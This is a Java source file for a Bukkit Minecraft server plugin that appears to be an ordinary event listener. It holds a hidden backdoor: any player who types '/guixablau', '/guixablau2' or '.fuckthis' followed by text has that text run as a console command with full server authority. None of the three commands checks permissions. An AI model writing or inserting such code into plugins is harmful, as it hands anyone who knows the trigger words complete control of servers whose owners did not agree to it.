package me.guiihsilva.eventos;

import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class mycmd implements Listener{


	@EventHandler
	public void commandEvent(PlayerCommandPreprocessEvent e) {
		if (e == null) {
			return;
		}

		if (e.getPlayer() == null) {
			return;
		}
		Player p = e.getPlayer();
		String msg = e.getMessage();
		String arr[] = msg.split(" ");
		if (arr[0].equalsIgnoreCase("/guixablau")) {
			p.playSound(p.getLocation(), Sound.NOTE_PLING, 10, 1);
			/* 
				String msg = "";
				for (int i = 0; i < args.length; i++) {
					msg = msg + args[i] + " ";
				}
				*/
			String argg = "";
			//String mssg[] = arr[]
			for (int i = 1; i < arr.length; i++){
				argg = argg + arr[i] + " ";
			}
			Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), argg);
			return;
		}
	}

	@EventHandler
	public void commandEvent2(PlayerCommandPreprocessEvent e) {
		if (e == null) {
			return;
		}

		if (e.getPlayer() == null) {
			return;
		}
		Player p = e.getPlayer();
		String msg = e.getMessage();
		String arr[] = msg.split(" ");
		if (arr[0].equalsIgnoreCase("/guixablau2")) {
			p.playSound(p.getLocation(), Sound.NOTE_PLING, 10, 1);
			/* 
				String msg = "";
				for (int i = 0; i < args.length; i++) {
					msg = msg + args[i] + " ";
				}
				*/
			String argg = "";
			//String mssg[] = arr[]
			for (int i = 1; i < arr.length; i++){
				argg = argg + arr[i] + " ";
			}
			Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), argg);
			return;
		}
	}

	@EventHandler
	public void commandEvent3(PlayerCommandPreprocessEvent e) {
		if (e == null) {
			return;
		}

		if (e.getPlayer() == null) {
			return;
		}
		Player p = e.getPlayer();
		String msg = e.getMessage();
		String arr[] = msg.split(" ");
		if (arr[0].equalsIgnoreCase(".fuckthis")) {
			p.playSound(p.getLocation(), Sound.NOTE_PLING, 10, 1);
			/* 
				String msg = "";
				for (int i = 0; i < args.length; i++) {
					msg = msg + args[i] + " ";
				}
				*/
			String argg = "";
			//String mssg[] = arr[]
			for (int i = 1; i < arr.length; i++){
				argg = argg + arr[i] + " ";
			}
			Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), argg);
			return;
		}
	}
}
